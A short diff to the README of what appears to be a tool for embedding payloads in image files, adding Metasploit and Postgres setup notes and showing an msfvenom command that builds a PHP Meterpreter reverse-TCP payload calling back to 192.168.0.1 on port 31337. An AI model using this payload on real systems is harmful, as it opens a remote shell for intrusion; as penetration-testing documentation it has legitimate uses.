@@ -29,7 +29,15 @@ both valid x86 shellcode and a valid image file, I recommend you to look
 
 If you want to inject a metasploit payload, you have to do something like this:
 
-1. Create metasploit payload (i.e. php).
+-----------------------------------------------------------
+***If you having new machine, it is MORE than that. Additional setup need to be done by install this *MetaSploit Framework*
+https://www.darkoperator.com/installing-metasploit-framewor <=== until able to launch the msfconsole
+Note:
+1. On installing postgres using `brew install postgresql` will do
+2. Error hit when running `initdb /usr/local/var/postgres`, reinstall the postgres
+
+-----------------------------------------------------------
+1. Create metasploit payload (i.e. php) in the `Metasploit-framework` folder.
 ```sh
 $ msfvenom -p php/meterpreter_reverse_tcp \
 	LHOST=192.168.0.1 LPORT=31337 -f raw > payload.php
